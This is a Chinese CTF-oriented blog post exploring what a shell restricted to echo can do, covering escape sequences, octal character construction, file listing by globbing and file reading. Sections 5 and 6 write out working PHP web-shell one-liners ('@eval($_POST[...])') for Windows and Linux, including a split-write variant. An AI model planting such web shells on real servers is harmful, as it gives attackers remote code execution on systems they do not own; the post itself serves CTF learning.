+++
title = "一个echo能干嘛"
slug = "what-can-echo-do"
description = ""
date = "2024-08-15T19:30:06"
lastmod = "2024-08-15T19:30:06"
image = ""
license = ""
categories = ["talk"]
tags = ["姿势"]
+++

# 0x01 前言

今天看了一下一道命令执行，只有`echo`，其他任何命令都没有的情况如果获得`flag`

说实话我测试了很久但是还是卡着了,什么环境变量啊七七八八的,但是这些方法本质都是构造出命令,可是如果`bash`中没有命令的情况如何解决呢

# 0x02 学习

## 基础

`echo`命令能干什么我们来了解一下

`echo` 命令主要用于在命令行界面（如 Linux、Unix 或 macOS 的终端，或 Windows 的命令提示符）中显示文本字符串。

那么自然也有与符号的衔接

| 项     | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| \a     | 显示警告                                                     |
| \b     | 显示退格                                                     |
| \c     | 在输出中禁止另外跟在最终参数后面的**换行**字符。 所有跟在 **\c** 序列后的字符都被忽略。 |
| \f     | 显示走纸字符。                                               |
| \n     | 显示换行字符。                                               |
| \r     | 显示一个回车字符。                                           |
| \t     | 显示制表符。                                                 |
| \v     | 显示垂直制表符。                                             |
| \\     | 显示反斜杠符号。                                             |
| \0数字 | 显示一个 ASCII 值为 0、1、2、3 位八进制数的八位字符。        |

大部分的我们都认识了，但是这个八进制打印字符我们可以做个例子

```
echo -e "\0123"
这里将会打印八进制为123的字符即S
```

```
echo -e "\0173"
这里会打印八进制为173，十进制为123的字符即{
```

```python
def decimal_to_octal(decimal_number):
    return oct(decimal_number)[2:]

if __name__ == "__main__":
    # 获取用户输入
    decimal_number = int(input("请输入一个十进制整数: "))
    
    # 转换为八进制
    octal_number = decimal_to_octal(decimal_number)
    
    # 输出结果
    print(f"{decimal_number} 的八进制表示为: {octal_number}")
```

这里还有个问题就是如何去解析

双引号会自动解析一层命令，但是单引号不会

| 输入的命令         | 在 Shell 扩展后    | 处理完 echo 命令后 |
| ------------------ | ------------------ | ------------------ |
| echo hi\\\\there   | echo hi\\there     | hi\there           |
| echo 'hi\\\\there' | echo 'hi\\\\there' | hi\\there          |
| echo "hi\\\\there' | echo "hi\\there"   | hi\there           |

## 用法

首先就是我们web手最常用的

### 1

打印执行命令后结果

```bash
echo `whoami`;
```

### 2

输入文本并显示在标准输出上

```bash
echo handsome
```

### 3

`echo -e` 是 `echo` 命令的一个选项，用于启用对转义序列的支持。当使用 `-e` 选项时，`echo` 命令会解析并执行包含在字符串中的转义序列。

也就是上面的表格里面的大部分换行符之类的实现

```bash
root@VM-4-5-debian:~# echo -e "First line\nSecond line"
First line
Second line
```

其他的大家自己试吧

```bash
root@VM-4-5-debian:~# echo -e "i\blove"
love
root@VM-4-5-debian:~# echo -e "i \blove"
ilove

root@VM-4-5-debian:~# echo -e "a\tb"
a       b

root@VM-4-5-debian:~# echo -e "a\rb"
b
root@VM-4-5-debian:~# echo -e "a \rb"
b 
root@VM-4-5-debian:~# echo -e "\r"

root@VM-4-5-debian:~# echo -e "a  \r b"
 b 
 
root@VM-4-5-debian:~# echo -e "a \v b"
a 
   b
   
root@VM-4-5-debian:~# echo -e "a b c\cfafdfadfa"
a b croot@VM-4-5-debiaecho -e "a b c\cfafdfadfa\n"
a b croot@VM-4-5-debian:~# 

root@VM-4-5-debian:~# echo -e "a\fb"
a
 b
root@VM-4-5-debian:~# echo -e "a \f b"
a 
   b
```

多多尝试

### 4

相当于`ls`

```bash
root@VM-4-5-debian:~# echo *;
1.py
root@VM-4-5-debian:~# echo /*;
/bin /boot /data /dev /etc /home /initrd.img /initrd.img.old /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz /vmlinuz.old
```

### 5 写文件以及读取

```bash
root@VM-4-5-debian:~# a=1;echo $a;                                                                                              
1 
```

同时也可以写文件以及重定向读取文件但是这里为什么没有正确写入呢

```bash
root@VM-4-5-debian:~# echo "<?=eval($_POST[1]);?>" > 1.txt
root@VM-4-5-debian:~# echo *
1.py 1.txt
root@VM-4-5-debian:~# echo "$(<1.txt)"
<?=eval([1]);?>
```

覆盖文件

```bash
root@VM-4-5-debian:~# echo "a>b" >> 1.txt
root@VM-4-5-debian:~# echo "$(<1.txt)"
<?=eval([1]);?>
a>b
```

这个马的写入放在6

### 6 写马

#### Windows

```bash
echo ^<? php @eval($_POST['123']); ?^> > shell.php

echo ^<? php @eval($_POST['123']);?^> >> shell.php
```

#### linux

```bash
echo '<?php @eval($_POST["123"]); ?>' > 1.php

echo '<?php @eval($_POST["123"]); ?>' >> 1.php
```

还可以分段写入

```bash
echo '<?php ' > 1.php       #先写入php头		

echo '@eval(' >> 1.php      #追加内容

echo '$_POST["1"]);?>' >> 1.php  #追加最后部分内容
```

## 题目

这道题的姿势是读取文件没有绕过所以没啥好说的

# 0x03 小结

一个echo原来可以干这么多事情，太有意思了



